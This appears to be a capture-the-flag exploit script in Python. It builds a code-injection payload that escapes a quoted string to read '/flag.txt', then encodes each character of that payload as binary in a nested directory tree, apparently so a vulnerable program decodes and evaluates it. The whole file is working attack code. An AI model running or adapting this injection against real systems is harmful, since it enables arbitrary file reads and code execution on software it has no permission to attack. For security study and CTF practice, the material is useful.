from pathlib import Path
payload = '" + open("/flag.txt","r").read() + "'

cwd = Path.cwd() / "test"
def createPath(name,last=False):
    try:
        (cwd / name).mkdir()    
    except:
        pass

    try:
        if last:
            (cwd / name / "keep").touch()
    except:
        pass


createPath("")

for j,char in enumerate(payload):
    current = f"{j}-{str(ord(char))}"
    
    createPath(current,last=True)

    decoding = bin(ord(char))[2:].rjust(8,"0")

    for direction,decode in zip(["1","2"],(decoding[:4],decoding[4:])):
        curr = current + f"/{direction}"
        createPath(curr,last=True)
        for i,binval in enumerate(decode):
            if binval == "0":
                createPath(curr + f"/{i}_0",last=True)
            else:
                createPath(curr + f"/{i}_1")
                createPath(curr + f"/{i}_1/anchor",last=True)




    




